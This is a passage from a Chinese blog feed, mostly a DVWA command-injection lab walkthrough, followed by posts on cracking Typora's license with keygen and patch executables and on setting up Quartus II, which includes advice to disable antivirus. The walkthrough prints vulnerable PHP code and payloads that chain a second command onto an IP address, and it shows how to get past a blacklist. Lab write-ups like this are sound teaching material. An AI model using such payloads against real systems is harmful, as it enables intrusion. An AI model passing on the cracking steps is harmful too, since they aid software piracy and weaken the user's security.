class="hljs-comment">//php_uname函数返回运行PHP函数的操作系统信息</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-comment">//shell_exec函数：通过 shell 执行命令并将完整的输出以字符串的方式返回</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-comment">//shell_exec函数：通过 shell 执行命令并将完整的输出以字符串的方式返回</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br><span class="hljs-comment">//打印 $cmd 的数据</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="函数解析："><a href="#函数解析：" class="headerlink" title="函数解析："></a>函数解析：</h5><ol><li><p><strong>isset()函数</strong></p><p>用于检查变量是否已设置并且非NULL</p><p><strong>语法</strong>： isset ($var)</p><p>​    <strong>$var</strong>：要检测的变量</p></li><li><p><strong>stristr函数</strong></p><p>搜索字符串在另一字符串中的第一次出现</p><p><strong>语法</strong>：stristr(<em>string,search,before_search</em>)</p><p>​    string：必需。规定被搜索的字符串。</p><p>​    search：必需。规定所搜索的字符串。</p><p>​    before_search：可选。一个默认值为”false”的布尔值。</p></li><li><p><strong>php_uname函数</strong></p><p>返回运行PHP的操作系统的相关描述</p><p><strong>语法</strong>：php_uname ([$mode=”a”])</p><p>​     mode 是单个字符，用于定义要返回什么信息： </p><p>​    ‘a’：此为默认。包含序列 “s n r v m” 里的所有模式。 </p><p>​    ’s’：操作系统名称。例如： FreeBSD。 </p><p>​    ‘n’：主机名。例如： localhost.example.com。 </p><p>​    ‘r’：版本名称，例如： 5.1.2-RELEASE。 </p><p>​    ‘v’：版本信息。操作系统之间有很大的不同。 </p><p>​    ‘m’：机器类型。例如：i386。 </p></li><li><p><strong>shell_exec函数</strong></p><p>通过shell执行命令并以字符串的形式返回完整的输出。</p></li></ol><h5 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h5><p>根据代码分析可以发现，代码中是无任何过滤的，用户端可以直接拼接特定的命令，来执行并获取想要的信息。</p><p>可以用以下命令来拼接输入的命令：可以拼接所有的命令执行函数</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">A</span><span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">B</span><span class="hljs-comment">//A后台运行，A和B同时执行</span><br><span class="hljs-selector-tag">A</span><span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">B</span><span class="hljs-comment">//A执行成功后才执行B</span><br><span class="hljs-selector-tag">A</span>|<span class="hljs-selector-tag">B</span><span class="hljs-comment">//A执行的输出结果作为B命令的参数，A不论正确与否，都会执行B</span><br><span class="hljs-selector-tag">A</span>||<span class="hljs-selector-tag">B</span><span class="hljs-comment">//A执行失败后才执行B命令</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">即：<br><span class="hljs-number">127.0.0.1</span>&amp;ipconfig（其他也可以）<br><span class="hljs-number">127.0.0.1</span>&amp;&amp;ipconfig(可以其他命令)<br><span class="hljs-number">127.0.0.1</span>|ipconfig(可以其他命令)<br><span class="hljs-number">127.0.0.1</span>||ipconfig(可以其他命令)<br><br></code></pre></td></tr></table></figure><p><img src="/2024/02/22/DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/1-1.jpg" alt="图1-1"></p><hr><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><h5 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-comment">//将&amp;&amp;和;复制为空，这里相当于过滤</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>    <span class="hljs-comment">//在array_keys函数中查找$substitutions名的值，也就是“&amp;&amp;”和“;”</span><br>    <span class="hljs-comment">//str_replace函数中找找array_keys函数返回的键名，也就是“&amp;&amp;”和“;”。然后执行$substitutions变量的值，只要匹配到“&amp;&amp;”或“;”值就会被替换为空值。规定搜索$target变量</span><br>    <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-comment">//php_uname函数中返回运行PHP的操作系统信息</span><br>    <span class="hljs-comment">//stristr函数根据php_uname函数返回的值，匹配“windows NT”值第一次出现的地方，如果有就代表是windows系统，则执行if语句，反之则执行else语句</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="函数解析：-1"><a href="#函数解析：-1" class="headerlink" title="函数解析："></a>函数解析：</h5><ol><li><p><strong>str_replace函数</strong></p><p>替换字符串中的一些字符（区分大小写）</p><p><strong>语法</strong>：str_replace(find,，replace，string，count)</p><p>​    find    必需。规定要查找的值</p><p>​    replace  必需。规定替换find中的值的值</p><p>​    string     必需。规定被搜索的字符串</p><p>​    count     可选。一个变量，对替换数进行计数</p></li><li><p><strong>array_keys函数</strong></p><p>返回包含数组中所有键名的一个新数组</p><p><strong>语法</strong>：array_keys(array，value，strict)</p><p>​    array    必需。规定数组</p><p>​    value    可选。可以指定键值，然后只有该键值对应的键名会被返回</p><p>​    strict    可选。与 value 参数一起使用</p></li></ol><h5 id="构建payload-1"><a href="#构建payload-1" class="headerlink" title="构建payload"></a>构建payload</h5><p>根据代码分析，我们发现代码中对“&amp;&amp;”和“;”符号进行了过滤，只要在攻击时不适用这两个符号就可以实现攻击</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">即：<br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-meta">&amp;ipconfig</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">|ipconfig</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">||ipconfig</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/22/DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/1-2.jpg"></p><hr><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><h5 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = trim(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h5><p>High的代码和medium是差不多的，只是过滤的比较多</p><h5 id="构建payload-2"><a href="#构建payload-2" class="headerlink" title="构建payload"></a>构建payload</h5><p>通过对代码的分析可以看到，这次的黑名单比medium多了很多，我们能用到的符号基本都是被过滤了的</p><p>仔细观察可以发现“|”的过滤中，是加了空格的，所以我们在攻击时可以使用“|”符号进行攻击，只要不加空格就可以</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">即：<br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">|ipconfig</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/22/DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/1-3.jpg"></p><hr><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><h5 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br>    <span class="hljs-variable">$target</span> = stripslashes( <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Split the IP into 4 octects</span><br>    <span class="hljs-variable">$octet</span> = explode( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Check IF each octet is an integer</span><br>    <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br>        <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.</span><br>        <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>        <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>            <span class="hljs-comment">// Windows</span><br>            <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// *nix</span><br>            <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        &#125;<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这关是不存在攻击可能性的安全关，直接分析源代码就可以</p><p>首先，这里防止命令注入的思路就是白名单，也就是说对输入进行过滤，只允许输入ip地址</p><p>具体来说就是，把输入的数据根据点分为4段，每一段都判断一下是不是数字，总共是不是四段，如果是的话，再用点把4段数字拼接起来。</p><h5 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h5><ol><li><p><strong>stripslashes函数</strong></p><p>删除反斜杠</p><p><strong>语法</strong>：stripslashes(string)</p><p>​        string    必需。规定要检查的字符串</p></li><li><p><strong>explode函数</strong></p><p>使用一个字符串分割另一个字符串，并返回由字符串组成的数组</p><p><strong>语法</strong>：explode(separator，string，limit)</p><p>​    separator    必需。规定在哪里分隔字符串。</p><p>​    string        必需。要分隔的字符串</p><p>​    limit           可选。规定所返回的数组元素的数目。</p></li><li><p><strong>is_numeric函数</strong></p><p>用于检测变量是否为数字或数字字符串</p><p><strong>语法</strong>：is_numeric ($var)</p><p><strong>参数</strong>： $var    要检测的变量</p><p>​        </p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>DVWA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typora1.7.6安装、激活</title>
    <link href="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/"/>
    <url>/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="Typora1-7-6安装、激活"><a href="#Typora1-7-6安装、激活" class="headerlink" title="Typora1.7.6安装、激活"></a>Typora1.7.6安装、激活</h2><h3 id="一、安装Typora"><a href="#一、安装Typora" class="headerlink" title="一、安装Typora"></a>一、安装Typora</h3><ol><li><p>双击“typora-setup-x64-1.7.6.exe”安装包</p><p>如果之前安装过先卸载，删除原文件夹</p></li><li><p>选择”Install for all users”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/1-2.jpg" alt="图1-"></p><p>​    图1-1 选择安装模式</p></li><li><p>选择安装目录，然后选择”Next”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/1-2.jpg" alt="图1-2"></p><p>​    图1-2 选择安装目录</p></li><li><p>勾选“Create a desktop shortcut”，然后选择“Next”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/1-3.jpg" alt="图1-3"></p><p>​    图1-3 选择额外任务</p></li><li><p>选择“Install”安装</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/1-4.jpg" alt="图1-4"></p><p>​    图1-4 安装</p></li><li><p>完成安装，去掉“Launch Typora”勾选，然后选择“Finish”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/1-5.jpg" alt="图1-5"></p><p>​    图1-5 完成安装</p></li></ol><h3 id="二、激活Typora"><a href="#二、激活Typora" class="headerlink" title="二、激活Typora"></a>二、激活Typora</h3><ol><li><p>把“license-gen.exe”和“TyproaCrack.exe”放到安装Typora的目录下</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/2-1.jpg" alt="图2-1"></p><p>​    图2-1 复制“license-gen.exe”和“TyproaCrack.exe”放到安装Typora的目录下</p></li><li><p>管理员模式运行“powershell”或”cmd”,我这使用的“powershell”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/2-2.jpg" alt="图2-2"></p><p>​    图2-2 运行“posershell”</p></li><li><p>然后进入”CD “安装目录” “到安装Typora安装目录</p><p>输入”.\license-gen.exe”，会自动生成一个序列号</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/2-3.jpg" alt="图2-3"></p><p>​    图2-3 运行“license-gen.exe”生成序列号</p></li><li><p>在确保 typora 软件关闭的情况下，输入”.TyproaCrack.exe”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/2-4.jpg" alt="图2-4"></p><p>​    图2-4 运行“.TyproaCrack.exe”</p></li><li><p>打开Typora，随便输入邮箱，然后把刚刚的序列号复制进去，最后点“激活”</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/2-5.jpg" alt="图2-5"></p><p>​    图2-5 激活页面</p></li><li><p>激活成功</p><p><img src="/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/2-6.jpg" alt="图2-6"></p><p>​    图2-6 激活成功</p></li></ol><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安装</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FPGA环境搭建</title>
    <link href="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="FPGA环境搭建"><a href="#FPGA环境搭建" class="headerlink" title="FPGA环境搭建"></a>FPGA环境搭建</h2><h3 id="一、Quartus-II-的下载"><a href="#一、Quartus-II-的下载" class="headerlink" title="一、Quartus II 的下载"></a>一、Quartus II 的下载</h3><p>百度网盘下载链接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>a9d-bq9RZmWrRV542X4IEA<br> 提取码：ifte<br></code></pre></td></tr></table></figure><h3 id="二、安装前的准备"><a href="#二、安装前的准备" class="headerlink" title="二、安装前的准备"></a>二、安装前的准备</h3><p>​    1.在C盘意外的盘内新建一个文件夹，命名为 <code>FPGA</code> (我这里使用的虚拟机，所以就在C盘新建文件夹)，盘符的空间最好有20G以上</p><p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.1.png"></p><p>​    2.打开 <code>FPGA</code> 文件夹，在里面新建 <code>Quartus II</code> 和 <code>modelSim</code> 文件夹</p><p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.2.png"></p><h3 id="三、Quartus-II-的安装"><a href="#三、Quartus-II-的安装" class="headerlink" title="三、Quartus II 的安装"></a>三、Quartus II 的安装</h3><p>​        1.解压压缩包</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.1.png" style="zoom: 67%;"><p>​        2.使用管理员运行可执行程序(<code>运行前退出所有杀软，包括Windows Defender</code>)</p><p>​        3.进入安装向导</p><p>​            1.进入 welcom 界面，点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.1.png" style="zoom:67%;"><p>​            2.勾选“I accept the agreement”并点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.2.png" style="zoom: 67%;"><p>​            3.选择安装路径，选择刚刚我们创建的“<code>Quartus II</code>”文件夹，然后点击“<code>Next</code>”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.3.png" style="zoom:67%;"><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/blog\source\_posts\FPGA环境搭建\3.3.3.1.png" style="zoom:67%;"><p>​            4.这里就是安装一些器件库，全部勾选，然后点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.4.png" style="zoom:67%;"><p>​            5.这里表示要使用的空间，以及剩余磁盘空间大小，点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.5.png" style="zoom:67%;"><p>​            6.安装过程(等待时间可能会比较久)，等待完成后点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.6.png" style="zoom:67%;"><p>​            7.安装完成，这里直勾选“Create shortcuts on Desktop”点击“Finish”。至此，Quartus II就安装完成了</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.7.png" style="zoom:67%;"><p>​            8.我们打开“Quartus II”软件，这里先选择试用30天，后续讲解破解过程</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.8.png" style="zoom:67%;"><p>​            9.这里未提示需要安装器件库，所以可以直接使用</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.3.9.png" style="zoom: 50%;"><p>​                    <strong>a.</strong> <strong>器件库的安装，首先需要下载对应的器件库</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/z123459985/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">105349357</span><br><br>说明：<br></code></pre></td></tr></table></figure><p>​                    b.将下载好的器件库，放到“Quartus II\quartus\bin”目录下</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.b.png" style="zoom: 67%;"><p>​                    c.打开“Quartus II”软件，在工具栏中选择“Tools”，然后选择“Install Devices”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.c.png" style="zoom: 